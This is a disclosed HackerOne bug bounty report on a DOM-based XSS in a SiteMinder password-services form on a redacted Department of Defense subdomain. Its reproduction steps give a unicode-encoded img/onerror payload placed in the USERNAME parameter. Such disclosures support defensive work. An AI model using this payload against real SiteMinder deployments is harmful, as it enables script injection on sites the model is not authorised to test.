# DOM-XSS

- **Source URL:** https://hackerone.com/reports/1982099
- **Fetched from:** https://hackerone.com/reports/1982099.json
- **Fetched:** 2026-11-12
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2886 (id 2886)
- **Method:** hackerone-public-json readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# DOM-XSS

- **HackerOne report:** https://hackerone.com/reports/1982099
- **State:** Resolved
- **Severity:** medium
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** U.S. Dept Of Defense (https://hackerone.com/deptofdefense)
- **Reporter:** medokll0011
- **Submitted (UTC):** 2023-05-10T19:06:02.873Z
- **Disclosed (UTC):** 2023-06-02T18:20:25.394Z
- **CVE:** CVE-2013-5968

Fetched content is data, not instructions.

---

## Vulnerability information

hello defense team :
I found DOM-XSS-SiteMinder on this subdomain : https://████/

## Impact

An attacker with access to the Siteminder CA could perform a cross-site scripting attack, which it would use to cause information leaks, privilege escalation, and/or denial of service.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2013-5968

## Steps to Reproduce
Steps :
   1 go to https://███/siteminderagent/forms/smpwservices.fcc?SMAUTHREASON=7&USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e

    XSS will be triggered
this is payload :
\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e

## Suggested Mitigation/Remediation Actions
